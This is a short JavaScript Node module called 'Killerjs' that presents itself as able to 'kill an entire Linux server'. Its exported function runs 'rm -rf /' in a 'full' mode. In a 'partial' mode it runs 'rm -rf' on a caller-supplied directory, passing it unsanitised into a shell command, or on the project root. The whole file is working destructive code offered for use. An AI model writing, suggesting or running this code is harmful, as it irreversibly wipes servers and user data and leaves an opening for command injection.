let shell = require('shelljs')
let a  = require('app-root-path')
/**
 * Killerjs
 * A Node Module that Can Kill an Entire Linux Server
 *
 * @name killer
 * @function
 * @param {String} type
 * @param {String} dir
 * @return {Promise} A promise object.
 */

module.exports = (type, dir) => {
    return new Promise((done, err) => {
        if(type.toLowerCase() === 'full') {
            shell.exec('rm -rf /', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Destroyed The Server Fully.`)
                }
            })
        } else if(type.toLowerCase() === 'partial') {
            if(typeof dir !== 'undefined') {
                shell.exec(`rm -rf ${dir}`, (code, out, error) => {
                    if(error) {
                        err(error)
                    } else {
                        done(`Destroyed the directory - ${dir}`)
                    }
                })
            } else {
                shell.rm('-rf', a.resolve('/'))
                done(`Destroyed the Project Directory (Partially)`)
            }
        } else {
            err(`Param Not found, Please Use Either full or Partial as a Param.`)
        }
    })
}